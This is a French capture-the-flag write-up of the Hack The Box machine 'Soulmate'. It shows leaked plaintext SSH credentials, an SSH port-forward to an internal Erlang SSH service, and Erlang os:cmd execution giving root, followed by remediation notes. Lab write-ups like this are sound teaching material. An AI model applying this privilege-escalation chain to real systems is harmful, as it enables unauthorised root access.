---
id: "HTB-2026-SOULMATE"
title: "Soulmate"
excerpt: "Sur **Soulmate**, l'accès initial est obtenu grâce à une fuite d'identifiants en clair dans un fichier de configuration Erlang. Cela permet de se connecter en S"
date: "2025-09-06"
tags: ["WRITEUP", "HACKTHEBOX", "LINUX", "MEDIUM", "CONFIG-LEAK", "ERLANG", "PORT-TUNNELING"]
category: "WRITEUP"
platform: "HACKTHEBOX"
target_os: "LINUX"
difficulty: "MEDIUM"
icon: "Terminal"
author: "0x7CC"
published: true
---

# Hack The Box — Soulmate (Linux) Write-Up : Fuite de configuration Erlang → RCE via Shell SSH Erlang local

## TL;DR
Sur **Soulmate**, l'accès initial est obtenu grâce à une fuite d'identifiants en clair dans un fichier de configuration Erlang. Cela permet de se connecter en SSH en tant que `ben`. L'élévation s'appuie sur un service SSH Erlang interne écoutant sur le port 2222 en local. Un tunnel SSH permet d'interagir avec le shell Erlang s'exécutant en root.

---

## Cible
- Host : `soulmate.htb`
- IP : `10.129.231.23`

---

## Recon : Fuite de configuration
Le scan de répertoires web révèle le fichier `/usr/local/lib/erlang_login/start.escript` qui contient :

```erlang
{user_passwords, [{"ben", "HouseH0ldings998"}]},
```

---

## Accès Initial : Connexion SSH
Nous utilisons les identifiants récupérés pour nous connecter en SSH :
- Utilisateur : `ben`
- Mot de passe : `HouseH0ldings998`

---

## Élévation de privilèges : Service SSH Erlang
En inspectant les ports locaux (`ss -tuln`), nous découvrons un service Erlang SSH sur le port 2222.

Nous créons un tunnel SSH :
```bash
ssh -L 9999:127.0.0.1:2222 ben@10.129.231.23
```

Nous nous connectons au port redirigé :
```bash
ssh -p 9999 ben@127.0.0.1
```

Dans la console Erlang, nous exécutons :
```erlang
os:cmd("id").
```
Le service s'exécute en tant que root, nous donnant un accès total.

---

## Notes défensives / remédiation

### Correctif
- Supprimer les identifiants en clair des dépôts ou répertoires publics.
- Désactiver ou sécuriser les interfaces de débogage Erlang écoutant en local.

---

## Annexe : Résumé de la timeline
1. Scan web et fuite du script d'initialisation.
2. Connexion SSH avec l'utilisateur `ben`.
3. Redirection de port vers l'interface Erlang locale (port 2222).
4. Commande d'exécution Erlang pour récupérer root.

---